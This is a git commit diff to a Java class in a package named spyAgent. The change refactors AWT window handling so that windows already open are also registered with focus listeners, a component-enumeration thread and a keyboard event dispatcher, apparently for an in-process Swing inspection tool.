cf01e8354de3da2f60bd21d030322a7ddd47bee7
Bruno Moraes <moraes.7bruno@gmail.com>
2025-08-27 20:00:37 -0300

    Add dispatcher for existing windows

--- src/spyAgent/WinEventDispatchListener.java
+++ src/spyAgent/WinEventDispatchListener.java
@@ -18,20 +18,37 @@ public class WinEventDispatchListener implements AWTEventListener {
     WindowTracker winTrack = new WindowTracker();
     private static ArrayList<KeyboardFocusManager> activeFocusManagers = new ArrayList<>();
 
+    public WinEventDispatchListener() {
+        registerExistingWindows();
+    }
+
+    private void registerExistingWindows() {
+        Window[] windows = Window.getWindows();
+        for (Window win : windows) {
+            if (win.isDisplayable()) {
+                setupWindow(win);
+            }
+        }
+    }
+
+    private void setupWindow(Window win) {
+        Thread enuTh = new Thread(new CompEnum(win));
+        enuTh.start();
+        winTrack.activeWindow = win;
+        win.addWindowFocusListener(winTrack);
+        KeyboardFocusManager manager = KeyboardFocusManager.getCurrentKeyboardFocusManager();
+        if (!activeFocusManagers.contains(manager)) {
+            manager.addKeyEventDispatcher(new KeyboardListener(winTrack));
+            activeFocusManagers.add(manager);
+        }
+    }
+
     public void eventDispatched(AWTEvent evt) {
 
         if (evt.getID() == WindowEvent.WINDOW_OPENED) {
             Component compon = (Component) evt.getSource();
-            Thread enuTh = new Thread(new CompEnum(compon));
-            enuTh.start();
             Window win = (Window) compon;
-            winTrack.activeWindow = win;
-            win.addWindowFocusListener(winTrack);
-            KeyboardFocusManager manager = KeyboardFocusManager.getCurrentKeyboardFocusManager();
-            if (!activeFocusManagers.contains(manager)) {
-                manager.addKeyEventDispatcher(new KeyboardListener(winTrack));
-                activeFocusManagers.add(manager);
-            }
+            setupWindow(win);
         }
     }
 
